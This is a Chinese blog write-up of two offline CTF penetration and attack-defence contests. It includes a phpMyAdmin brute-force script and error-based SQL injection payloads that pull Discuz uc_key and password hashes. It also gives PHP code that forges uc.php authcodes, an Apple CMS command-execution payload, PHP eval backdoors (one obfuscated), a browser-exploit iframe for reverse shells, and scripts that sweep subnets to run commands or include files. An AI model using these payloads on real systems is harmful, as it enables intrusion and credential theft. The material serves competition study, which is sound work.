> 原文链接: https://www.anquanke.com//post/id/98653 


# 两次ctf线下赛渗透测试及攻防记录


                                阅读量   
                                **227806**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0199ab2fa8af5c9e0f.jpg)](https://p2.ssl.qhimg.com/t0199ab2fa8af5c9e0f.jpg)

> 本篇原创文章参加双倍稿费活动，预估稿费为800元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)

> 本文主要记录某两次线下赛的部分解题过程。涉及预留后门、sql注入等知识点，做了一些解题记录分享给大家。



## 线下赛1

### <a class="reference-link" name="%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA1%E2%80%9410.10.10.131"></a>渗透靶机1—10.10.10.131

使用nessus扫描靶机，发现靶机存在ms17-010漏洞，这个是永恒之蓝的漏洞<br>
于是使用metasploit进行攻击

[![](https://p5.ssl.qhimg.com/t014c7be1a24b9e89af.png)](https://p5.ssl.qhimg.com/t014c7be1a24b9e89af.png)

### <a class="reference-link" name="%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA2%E2%80%9410.10.10.254"></a>渗透靶机2—10.10.10.254

0x01御剑扫描发现存在phpmyadmin目录，并且可以访问，抓包分析请求包，然后写python脚本进行登录爆破。<br>
请求包是这样的，留意红色框框，base64解码之后可以发现其实就是我输入的用户名和密码、

[![](https://p0.ssl.qhimg.com/t01c8acd9d4cec6e225.png)](https://p0.ssl.qhimg.com/t01c8acd9d4cec6e225.png)

[![](https://p2.ssl.qhimg.com/t01c9b2f35eb738ea67.png)](https://p2.ssl.qhimg.com/t01c9b2f35eb738ea67.png)

直接使用burp爆破后被限制访问，后来知道它限制了使用burp爆破，于是写脚本爆破[代码]

```
#coding=utf-8
import requests
import base64

def get_b64_u_p(passwdFile): 
    username='root'
    pF=open(passwdFile,'r')
    for line in pF.readlines():
        password=line.strip('r').strip('n')
        print "[+] Trying: "+username+"/"+password
        if(login(base64.b64encode(username+':'+password))):
            break

def login(b64_u_p):
    url="http://10.10.10.254/phpMyAdmin/";
    headers=`{`
        'Host': '10.10.10.254',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Cookie': 'phpMyAdmin=905a110bc7a3544de32bc6bd01a88c7e78236bf8; pma_lang=zh-utf-8; pma_charset=utf-8; pma_collation_connection=utf8_general_ci; pma_fontsize=82%25; pma_theme=original; tz_offset=28800',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Authorization': 'Basic '+b64_u_p   #cm9vdDphYWFh
    `}`
    req=requests.get(url=url,headers=headers)
    if "错误" not in req.content:
        print '[#]Find username/password : '+base64.b64decode(b64_u_p)
        return 1
    return 0

get_b64_u_p('password.txt')
```

结果<br>[![](https://p3.ssl.qhimg.com/t01d279577015112ab2.png)](https://p3.ssl.qhimg.com/t01d279577015112ab2.png)

于是直接登进phpmyadmin写shell<br>
select ‘&lt;?php [@eval](https://github.com/eval)($_POST[a]);?&gt;’ into outfile ‘/var/www/a.php’<br>
后面可以知道这是我们的攻防机<br>
并得到后台密码，后台密码也是ssh的登录密码

### <a class="reference-link" name="%E6%94%BB%E9%98%B2%E2%80%94%E6%B8%97%E9%80%8F%E5%85%B6%E4%BB%96%E9%98%9F%E4%BC%8D%E7%9A%84%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E6%9C%BA"></a>攻防—渗透其他队伍的内网攻防机

利用攻防机10.10.10.254作为跳板机渗透其他队伍的内网攻防机192.168.10.128<br>
这台攻防机有两个网卡ip分别是10.10.10.254和192.168.10.254<br>[![](https://p1.ssl.qhimg.com/t016e66b9cefb3d3304.png)](https://p1.ssl.qhimg.com/t016e66b9cefb3d3304.png)

其他选手的攻防机所在的网段是192.168.xx.xx<br>
这里需要知道的是因为选手机所在的网段是10.10.xx.xx是没办法直接访问网段192.168.xx.xx的，所以要攻击对手的话我们需要使用我们自己的一台攻防机来作为攻击的跳板机，其中有一台我后面发现存在ms10_002_aurora漏洞，这是一个浏览器漏洞。因为所有队伍攻防机的初始配置都是一样的，所以我后面想到利用这个漏洞， 利用思路是:<br>
先在自己的攻防机192.168.10.254上面挂一个ms10_002_aurora漏洞利用的黑页，然后如果对手使用了跳板机上有浏览器漏洞的机子访问了我们的攻防机192.168.10.254的话，就会触发漏洞反弹一个shell给我们。

<a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%A6%82%E4%B8%8B"></a>**利用过程如下**

例如对手的一台存在该漏洞的跳板机是192.168.10.128<br>
我们先挂载上漏洞利用的网页在我们的10.10.10.128:8080/exploit<br>[![](https://p3.ssl.qhimg.com/t01b0f3fa194d705612.png)](https://p3.ssl.qhimg.com/t01b0f3fa194d705612.png)

然后我们在自己的攻防机10.10.10.254上的index.html中添加上一句iframe<br>
(也就是挂载上了192.168.10.254这台攻防机上)<br>[![](https://p0.ssl.qhimg.com/t01a86c2274c7a1de81.png)](https://p0.ssl.qhimg.com/t01a86c2274c7a1de81.png)

然后对手的一台存在该漏洞的跳板机192.168.10.128访问了我们的192.168.10.254这台攻防机<br>
(因为对手要攻击我们的攻防机获取flag，所以对手一般都会使用跳板机的浏览器去访问我们攻防机的web网站)<br>
这时候就会触发漏洞反弹一个shell给我们，由此我们就成功渗透进了对手的192.168.10.128这台内网机子。<br>[![](https://p1.ssl.qhimg.com/t0102546f734e463ea1.png)](https://p1.ssl.qhimg.com/t0102546f734e463ea1.png)



## 线下赛2

### <a class="reference-link" name="%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"></a>环境说明

拓扑图<br>[![](https://p4.ssl.qhimg.com/t01a7af241816397017.png)](https://p4.ssl.qhimg.com/t01a7af241816397017.png)

拓扑图是主办方在后阶段发的，刚开始的网络结果全部要自己去探测。<br>
比赛是渗透+AWD攻防模式，一个队伍有十台信息点靶机(用户名为info1-info10)和5台攻防机(用户名score1-score5)，要先渗透进自己的信息点机才能够进一步渗透进自己的攻防机，是个多级内网的结构。

<a class="reference-link" name="%E4%B8%BB%E8%A6%81%E6%80%9D%E8%B7%AF%E5%B0%B1%E6%98%AF:"></a>**主要思路就是:**

> 渗透进信息点机获取相应的flag和信息，然后渗透进自己的攻防机，然后在跳板机上对其他队伍进行攻击渗透。

### <a class="reference-link" name="%E6%B8%97%E9%80%8Finfo4%E2%80%94ip%20192.1.1.14"></a>渗透info4—ip 192.1.1.14

这是一个discuz7.2的网站<br>
自己电脑的ip为192.1.1.1

faq.php文件存在sql注入，sql注入的原理参考<br>[https://www.waitalone.cn/discuz72-faq-sql-injection.html](https://www.waitalone.cn/discuz72-faq-sql-injection.html)<br>
在Discuz中，uc_key是UC客户端与服务端通信的通信密钥，获取到uc_key之后就可以计算出code,导致 /api/uc.php中存在代码写入漏洞。<br>
这题拿shell主要思路是:获取uc key然后计算出code最后xml注入getshell<br>
(为了更好的说明，附上本人复现的截图)<br>
uc_key长度为64位，需要注入两次才能拿到完整的uc_key<br>
payload<br>
获取前62位<br>
faq.php?action=grouppermission&amp;gids[99]=’&amp;gids[100][0]=) and (select 1 from (select count(**),concat(floor(rand(0)**2),0x23,(select substr(authkey,1,62) from ucenter.uc_applications limit 0,1),0x23)x from information_schema.tables group by x)a)%23<br>[![](https://p0.ssl.qhimg.com/t0151b300f1e43ba433.png)](https://p0.ssl.qhimg.com/t0151b300f1e43ba433.png)

获取最后两位<br>
faq.php?action=grouppermission&amp;gids[99]=’&amp;gids[100][0]=) and (select 1 from (select count(**),concat(floor(rand(0)**2),0x23,(select substr(authkey,63,2) from ucenter.uc_applications limit 0,1),0x23)x from information_schema.tables group by x)a)%23<br>[![](https://p4.ssl.qhimg.com/t016f000def0c50b167.png)](https://p4.ssl.qhimg.com/t016f000def0c50b167.png)

最后获得uc_key为<br>
m5B4W93cV8ebvfb392l7Ias8PeLcl9LbSc29LeZcP9i6kc08t4X4u85bHbma77Dc

计算出code [代码]

```
&lt;?php
$timestamp = time()+10*3600;
$host="http://10.10.10.1/Discuz_7.2_SC_UTF8/upload";
$uc_key="m5B4W93cV8ebvfb392l7Ias8PeLcl9LbSc29LeZcP9i6kc08t4X4u85bHbma77Dc";
$code=urlencode(_authcode("time=$timestamp&amp;action=updateapps", 'ENCODE', $uc_key));
echo $code;

function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) 
`{`
    $ckey_length = 4;
    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey); 
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string); 
    $result = '';
    $box = range(0, 255); 
    $rndkey = array();
    for($i = 0; $i &lt;= 255; $i++) 
    `{`
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    `}`
    for($j = $i = 0; $i &lt; 256; $i++) 
    `{`
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    `}`
    for($a = $j = $i = 0; $i &lt; $string_length; $i++) 
    `{`
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    `}`
    if($operation == 'DECODE') 
    `{`
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) 
        `{`
            return substr($result, 26);
        `}` 
        else 
            `{`return '';`}`

    `}` 
    else 
        `{`return $keyc.str_replace('=', '', base64_encode($result));`}`

`}`
?&gt;
```

抓包/api/uc.php 并填写上相应的code的值，以及加上xml注入的数据<br>[![](https://p1.ssl.qhimg.com/t01dd8ad2254f6fa63a.png)](https://p1.ssl.qhimg.com/t01dd8ad2254f6fa63a.png)

一句话的路径在[http://192.1.1.14/config.inc.php](http://192.1.1.14/config.inc.php) ，密码是cmd<br>
于是可以获取到信息点的flag

使用下列语句注入出info4的后台登录账号密码和盐salt的值<br>
/faq.php?action=grouppermission&amp;gids[99]=’&amp;gids[100][0]=) and (select 1 from (select count(**),concat((select concat(username,0x3a,password,0x3a,salt,0x23) from ucenter.uc_members limit 0,1),floor(rand(0)**2))x from information_schema.tables group by x)a)%23<br>
得到<br>
info4:6f6decc4a51d89665f38cec4bc0ca97d:e114251<br>
密码的加密方式是<br>
$salt = substr(uniqid(rand()), -6);//随机生成长度为6的盐<br>
$password = md5(md5($password).$salt);//discuz中密码的加密方式<br>
直接拿去md5网站解密得到rampage<br>
后来发现这个账号密码也是info4的ssh的登录账号密码

### <a class="reference-link" name="%E6%B8%97%E9%80%8Finfo1%E2%80%94%E8%8B%B9%E6%9E%9Ccms%20ip%E4%B8%BA192.1.1.11"></a>渗透info1—苹果cms ip为192.1.1.11

存在命令执行漏洞<br>
漏洞原理参见[https://www.cnblogs.com/test404/p/7397755.html](https://www.cnblogs.com/test404/p/7397755.html)<br>
getshell的payload是<br>[http://192.1.1.11/index.php?m=vod-search&amp;wd=`{`if-A:assert($_POST[a])`}``{`endif-A`}`](http://192.1.1.11/index.php?m=vod-search&amp;wd=%7Bif-A:assert(%24_POST%5Ba%5D)%7D%7Bendif-A%7D)<br>
得到webshell之后可以看到score1shadow_backup文件和<br>
password_is_phone_num13993xxxxxx，知道密码开头的五位数是13993<br>
然后shadow文件里面是score1的密码密文<br>
$6$xNmo17Zn$4GqSN/zccHMud9uJgY7kGhU4W.ss4fMxQ9yNsQ/oWubYWE0xHf9.BuD5umI0wUhj8s2J1kH0L0JfhFEKu8u52/:17465:0:99999:7:::<br>
然后写脚本生成6位数的字典<br>
[代码]

```
f=open('zidian.txt','w')
for i in range(0,1000000):
    length=len(str(i))
    if(length==1):
        tmp='00000'+str(i)
    if(length==2):
        tmp='0000'+str(i)
    if(length==3):
        tmp='000'+str(i)
    if(length==4):
        tmp='00'+str(i)
    if(length==5):
        tmp='0'+str(i)
    if(length==6):
        tmp=str(i)
    f.write('13993'+tmp+'r')

f.close()
```

再使用john工具爆破得到密码明文<br>
破解shadow的命令<br>
john —wordlist 字典文件 shadow文件<br>
john —wordlist zidian.txt shadow.txt

然后查看数据库配置文件，有注释说这是从info2迁移的，连接数据库是info2用户，得到info2的密码为call911，然后登录上info2后在home目录发现mysql history，打开后发现是创建了一个info8的用户，密码为arkteam。



## 攻防

### <a class="reference-link" name="score1%E4%B8%8A%E6%98%AF%E4%B8%80%E4%B8%AAwordpress%204.7.x%E7%9A%84%E7%BD%91%E7%AB%99"></a>score1上是一个wordpress 4.7.x的网站

#### <a class="reference-link" name="1.%E9%A2%84%E7%95%99%E5%90%8E%E9%97%A8"></a>1.预留后门

&lt;?php [@eval](https://github.com/eval)($_GET[‘cmd’]); ?&gt;<br>
exp[代码]

```
import requests
part_url="/wp-includes/rest-api/endpoints/class-wp-rest-relations-controller.php?cmd=system('cat /opt/xnuca/flag.txt');"
for i in range(1,22):
    try:
        ip1='192.121.'+str(i)+'.31'
        ip='http://192.121.'+str(i)+'.31'
        full_url=ip+part_url
        res=requests.get(url=full_url,timeout=2)
        # print res.status_code
        if res.status_code!=404:
            print ip1
            print res.text
    except Exception,e:
        pass
```

#### <a class="reference-link" name="2.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"></a>2.文件包含漏洞

漏洞文件/wp-content/plugins/wp-vault/trunk/wp-vault.php<br>
参数wpv-image存在文件包含，漏洞关键代码如下[代码]

```
// Load CSS, JS files, or invoke file handler.
function wpv_init() `{`
    if (isset($_GET["wpv_file_id"])) `{`
        include(dirname(__FILE__) . "/wpv-file-handler.php");
        exit;
    `}`
    else if (isset($_POST["wpv-tooltip"])) `{`
        include(dirname(__FILE__) . "/ajax-response/wpv-tooltip.php");
        exit;
    `}`
    else if (isset($_GET["wpv-image"])) `{`
        include(dirname(__FILE__) . "/images/" . $_GET["wpv-image"]);
        exit;
    `}`
    else if (isset($_GET["wpv-css"])) `{`
        if (file_exists(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css")) `{`
            header("Content-type: text/css");
            include(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css");
            exit;
        `}`
        else if (file_exists(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css.php")) `{`
            header("Content-type: text/css");
            include(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css.php");
            exit;
        `}`
    `}`
```

文件包含利用exp[代码]

```
import requests
part_url='/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../opt/xnuca/flag.txt'
for i in range(1,22):
    try:
        ip1='192.121.'+str(i)+'.31'
        ip='http://192.121.'+str(i)+'.31'
        full_url=ip+part_url
        res=requests.get(url=full_url,timeout=2)
        # print res.status_code
        if res.status_code!=404:
            print ip1
            print res.text
    except Exception,e:
        pass
```

#### <a class="reference-link" name="3.kittycatfish%202.2%E6%8F%92%E4%BB%B6%20%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"></a>3.kittycatfish 2.2插件 存在sql注入

注入点1 ：/wp-content/plugins/kittycatfish/base.css.php?kc_ad=31&amp;ver=2.0<br>
注入点2：wp-content/plugins/kittycatfish/kittycatfish.php?kc_ad=37&amp;ver=2.0<br>
都是kc_ad参数，可以使用盲注直接load_file读取flag文件

#### <a class="reference-link" name="4.%20olimometer%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"></a>4. olimometer插件存在sql注入

注入点：/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 olimometer_id参数可以盲注直接load_file读取flag文件

#### <a class="reference-link" name="5.%20easy-modal%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"></a>5. easy-modal插件存在sql注入

同样存在sql盲注，但是首先得登录进后台才能利用

### <a class="reference-link" name="score4%E6%98%AF%E4%B8%80%E4%B8%AAjoomla3.x%E7%BD%91%E7%AB%99"></a>score4是一个joomla3.x网站

#### <a class="reference-link" name="1.%E5%AD%98%E5%9C%A8%E5%8F%98%E5%BD%A2%E7%9A%84%E9%A2%84%E7%95%99%E5%90%8E%E9%97%A8"></a>1.存在变形的预留后门

&lt;?php ($**=@$_GET[2]).@$**($_POST[1])?&gt;<br>
路径在/components/com_facegallery/controllers/update.php<br>
利用payload<br>
?2=assert post system(‘cat /opt/xnuca/flag.txt’);<br>
exp [代码]

```
import requests
shell='/components/com_facegallery/controllers/update.php?2=assert'
for i in range(1,22):
    try:
        ip='http://192.121.'+str(i)+'.34'
        full_url=ip+shell
        print ip
        post_data=`{`"1":"system('cat /opt/xnuca/flag.txt');"`}`
        res=requests.post(url=full_url,data=post_data)
        # print res.status_code
        print res.text
    except Exception,e:
        pass
```

### <a class="reference-link" name="%E5%B0%8F%E5%BC%9F%E8%83%BD%E5%8A%9B%E6%9C%89%E9%99%90%EF%BC%8C%E6%AC%A2%E8%BF%8E%E5%90%84%E4%BD%8D%E5%A4%A7%E5%B8%88%E5%82%85%E4%BB%AC%E8%A1%A5%E5%85%85%E3%80%82"></a>小弟能力有限，欢迎各位大师傅们补充。
